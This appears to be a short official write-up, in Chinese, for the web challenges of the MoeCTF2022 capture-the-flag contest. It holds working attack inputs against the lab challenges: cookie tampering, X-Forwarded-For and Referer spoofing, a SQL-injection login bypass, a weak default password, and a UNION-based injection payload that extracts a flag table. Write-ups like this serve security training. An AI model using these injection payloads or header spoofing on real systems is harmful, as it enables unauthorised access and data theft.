#  MoeCTF2022 Web Offcial Writeup

## ezhtml

右键/F12编辑元素，令各分数加起来等于总分且大于600即可。



## god_of_aim

控制台输入

aimTrainer.score=100000



## Cookiehead

将cookie中login改为1

Headers的X-Forwarded-For设为127.0.0.1

Referer设为http://127.0.0.1/index.php



## Sqlmap_boy

账号填admin" or 1=1--#，密码随意。

或者弱口令admin/admin即可登录。



第二处为单引号闭合。

Payload: secrets.php?id=-2' union select 1,2,flag from flag --+





